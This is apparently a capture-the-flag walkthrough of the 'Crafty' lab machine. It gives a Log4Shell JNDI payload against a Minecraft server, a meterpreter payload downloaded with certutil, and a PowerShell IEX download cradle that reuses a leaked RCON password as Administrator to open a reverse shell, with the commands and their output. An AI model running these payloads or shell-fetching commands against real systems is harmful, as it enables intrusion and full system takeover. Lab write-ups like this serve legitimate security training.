# Reconnaissances 
## Port Scanning
`$ sudo nmap -p- -T4 -v 10.10.11.249`
```
Nmap scan report for 10.10.11.249
Host is up (0.029s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
25565/tcp open  minecraft

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 120.03 seconds
           Raw packets sent: 131152 (5.771MB) | Rcvd: 80 (3.504KB)
```

`$ sudo nmap -p 80,25565 -A -v 10.10.11.249`
```
Nmap scan report for 10.10.11.249
Host is up (0.041s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://crafty.htb
|_http-server-header: Microsoft-IIS/10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   47.85 ms 10.10.14.1
2   47.84 ms 10.10.11.249

NSE: Script Post-scanning.
Initiating NSE at 12:46
Completed NSE at 12:46, 0.00s elapsed
Initiating NSE at 12:46
Completed NSE at 12:46, 0.00s elapsed
Initiating NSE at 12:46
Completed NSE at 12:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.71 seconds
           Raw packets sent: 90 (7.644KB) | Rcvd: 33 (2.028KB)
```

## Observe the HTTP
Define NS in localhost, then access it:
`$ echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
`$ firefox crafty.htb`

Minecraft vulnerability refer to: 
- https://nodecraft.com/blog/service-updates/minecraft-java-edition-security-vulnerability
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://purpurmc.org/docs/purpur/log4j/
- https://github.com/kozmer/log4j-shell-poc

# Pre-Exploit

Testing for log4j poc
```
$ git clone https://github.com/kozmer/log4j-shell-poc
$ wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
$ tar -xf jdk-8u181-linux-x64.tar.gz 
$ mv jdk1.8.0_181 jdk1.8.0_20
```

Edit the `poc.py`, change the `String cmd` value with it's compability
```
String cmd="cmd.exe"; #for windows shell
```

## Download Minicraft Client
Download `pyCraft`
`$ git clone https://github.com/ammaraskar/pyCraft`

Setup virtualenv for pyCraft:
```
$ virtualenv ENV
$ source ENV/bin/activate
$ pip3 install -r requirements.txt
```

# Exploit
Listening port
`$ rlwrap nc -lvnp 4444`

Running the poc
`$ python3 poc.py --userip 10.10.14.12 --webport 80 --lport 4444`

Then running the pyCraft
```
$ python3 start.py                                   
Enter your username: nbsc7
Enter your password (leave blank for offline mode): 
Enter server host or host:port (enclose IPv6 addresses in square brackets): 10.10.11.249
Connecting in offline mode...
Connected.
${jndi:ldap://10.10.14.12:1389/a}
```

## User Shell
```
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.249] 49750
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\users\svc_minecraft\server>type C:\Users\svc_minecraft\Desktop\user.txt
caa88d71283eaf94c7d6026c3fe2957f
```

# Privilege Escalation
## Enumeration
Looking for necessary files
```
c:\users\svc_minecraft\server>dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\users\svc_minecraft\server

10/26/2023  05:37 PM    <DIR>          .
10/26/2023  05:37 PM    <DIR>          ..
11/14/2023  10:00 PM                 2 banned-ips.json
11/14/2023  10:00 PM                 2 banned-players.json
10/24/2023  12:48 PM               183 eula.txt
03/09/2024  09:07 AM    <DIR>          logs
11/14/2023  11:22 PM                 2 ops.json
10/27/2023  01:48 PM    <DIR>          plugins
10/24/2023  12:43 PM        37,962,360 server.jar
11/14/2023  10:00 PM             1,130 server.properties
03/09/2024  10:45 AM               410 usercache.json
10/24/2023  12:51 PM                 2 whitelist.json
03/09/2024  10:45 AM    <DIR>          world
               8 File(s)     37,964,091 bytes
               5 Dir(s)   3,652,505,600 bytes free

c:\users\svc_minecraft\server>dir plugins
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\users\svc_minecraft\server\plugins

10/27/2023  01:48 PM    <DIR>          .
10/27/2023  01:48 PM    <DIR>          ..
10/27/2023  01:48 PM             9,996 playercounter-1.0-SNAPSHOT.jar
               1 File(s)          9,996 bytes
               2 Dir(s)   3,652,505,600 bytes free

c:\users\svc_minecraft\server>
```

## Try to Download the playercounter
### Upload meterpreter
`$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=9001 -f exe -o winmet.exe`
```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > set LHOST 10.10.14.12
LHOST => 10.10.14.12
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.12:9001 
```

Download it
```
c:\users\svc_minecraft\server>certutil -urlcache -f http://10.10.14.12:8000/winmet.exe %temp%/winmet.exe
certutil -urlcache -f http://10.10.14.12:8000/winmet.exe %temp%/winmet.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
c:\users\svc_minecraft\server>start %temp%/winmet.exe

c:\users\svc_minecraft\server>
```

Then
```
[*] Sending stage (201798 bytes) to 10.10.11.249
[*] Meterpreter session 1 opened (10.10.14.12:9001 -> 10.10.11.249:49753) at 2024-03-09 14:12:42 -0500

meterpreter > pwd
c:\users\svc_minecraft\server
meterpreter > cd plugins
meterpreter > dir
Listing: c:\users\svc_minecraft\server\plugins
==============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  9996  fil   2023-10-27 17:48:53 -0400  playercounter-1.0-SNAPSHOT.jar

meterpreter > download playercounter-1.0-SNAPSHOT.jar
[*] Downloading: playercounter-1.0-SNAPSHOT.jar -> /home/kali/Desktop/playercounter-1.0-SNAPSHOT.jar
[*] Downloaded 9.76 KiB of 9.76 KiB (100.0%): playercounter-1.0-SNAPSHOT.jar -> /home/kali/Desktop/playercounter-1.0-SNAPSHOT.jar
[*] Completed  : playercounter-1.0-SNAPSHOT.jar -> /home/kali/Desktop/playercounter-1.0-SNAPSHOT.jar
meterpreter > 
```

## Observe Playcounter with JD-GUI
```
public final class Playercounter extends JavaPlugin {  
  public void onEnable() {  
    Rcon rcon = null;  
    try {  
      rcon = new Rcon("127.0.0.1", 27015, "s67u84zKq8IXw".getBytes());  
    } catch (IOException e) {  
      throw new RuntimeException(e);  
    } catch (AuthenticationException e2) {  
      throw new RuntimeException(e2);  
    }   
    String result = null;  
    try {  
      result = rcon.command("players online count");  
      PrintWriter writer = new PrintWriter("C:\\inetpub\\wwwroot\\playercount.txt", "UTF-8");  
      writer.println(result);  
    } catch (IOException e3) {  
      throw new RuntimeException(e3);  
    }   
  }  
    
  public void onDisable() {}  
}
```

Seems like the parameter `rcon` contains a credential

## Use the Creds
Download the Ps reverseshell
`$ wget https://raw.githubusercontent.com/rioasmara/wordpress/master/rev.ps1`
```
Edit the ip address and port in rev.ps1 then listen
```
`$ python3 -m http.server 8000`
`$ rlwrap nc -lvnp 9001`

```
c:\users\svc_minecraft\server>powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
```
```
$SecPass = ConvertTo-SecureString 's67u84zKq8IXw' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12:8000/rev.ps1')" -Credential $cred
```
### Got Root
```
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.249] 49684
Windows PowerShell running as user Administrator on CRAFTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\users\svc_minecraft\server>type C:\Users\Administrator\Desktop\root.txt
b2f30392908dc4148a4735903256e8be
PS C:\users\svc_minecraft\server> 
```